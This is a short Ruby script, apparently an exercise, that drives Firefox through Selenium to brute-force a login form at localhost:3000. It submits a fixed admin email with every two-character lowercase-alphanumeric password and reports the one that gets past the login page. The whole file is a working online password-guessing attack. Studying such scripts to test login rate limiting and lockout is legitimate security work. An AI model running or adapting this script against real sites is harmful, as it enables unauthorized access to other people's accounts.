require 'selenium-webdriver'
require 'pry'


def check_password(driver, password)
  email_el = driver.find_element(:id, "email")
  password_el = driver.find_element(:id, "password")

  email_el.send_keys("admin@testing.com")
  password_el.send_keys(password)

  login = driver.find_element(:id, "login")
  login.click

  begin
    if driver.find_element(:id, "login")
      return false
    end
  rescue Selenium::WebDriver::Error::NoSuchElementError
    return true
  end
end

search_space = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
search_space.concat(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])

driver = Selenium::WebDriver.for :firefox

driver.navigate.to "http://localhost:3000/"

search_space.each do |char1|
  search_space.each do |char2|
    password = char1 + char2
    puts "Trying password: #{password}"
    if check_password(driver, password)
      puts "The password is #{password}"
      exit
    end
  end
end

